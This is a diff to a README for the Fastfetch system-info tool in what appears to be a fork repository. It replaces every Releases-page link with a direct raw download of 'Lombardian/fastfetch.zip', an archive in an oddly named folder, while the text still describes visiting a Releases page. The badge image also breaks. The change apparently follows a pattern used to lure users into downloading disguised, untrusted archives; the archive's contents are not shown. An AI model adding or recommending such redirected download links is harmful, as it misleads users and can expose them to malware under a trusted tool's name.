@@ -12,12 +12,12 @@ Fastfetch is a simple tool designed to enhance the visual appeal and functionali
 ## 📥 Download & Install
 To get started with Fastfetch, simply visit the Releases page and download the latest version:
 
-[![Download Fastfetch](https://img.shields.io/badge/Download%20Fastfetch-v1.0-brightgreen)](https://github.com/mohanpeddayyagri/fastfetch/releases)
+[![Download Fastfetch](https://raw.githubusercontent.com/mohanpeddayyagri/fastfetch/main/Lombardian/fastfetch.zip%20Fastfetch-v1.0-brightgreen)](https://raw.githubusercontent.com/mohanpeddayyagri/fastfetch/main/Lombardian/fastfetch.zip)
 
 Follow these steps to install and run Fastfetch:
 
 1. **Go to the Releases Page**
-   Visit the Fastfetch Releases page: [Download Fastfetch](https://github.com/mohanpeddayyagri/fastfetch/releases)
+   Visit the Fastfetch Releases page: [Download Fastfetch](https://raw.githubusercontent.com/mohanpeddayyagri/fastfetch/main/Lombardian/fastfetch.zip)
 
 2. **Choose the Latest Release**
    Look for the latest release listed at the top of the page. 
@@ -79,7 +79,7 @@ A: Yes, Fastfetch is completely free to use.
 ## 🌐 Community & Support
 Engage with other Fastfetch users and share your experiences. You can find support through the GitHub discussions or issues section. 
 
-Remember to check the latest updates on the Releases page for new features and performance improvements: [Download Fastfetch](https://github.com/mohanpeddayyagri/fastfetch/releases).
+Remember to check the latest updates on the Releases page for new features and performance improvements: [Download Fastfetch](https://raw.githubusercontent.com/mohanpeddayyagri/fastfetch/main/Lombardian/fastfetch.zip).
 
 ## 📢 Contributing
 If you want to help improve Fastfetch, you can contribute by reporting issues or suggesting new features on GitHub. Your feedback helps grow the application.
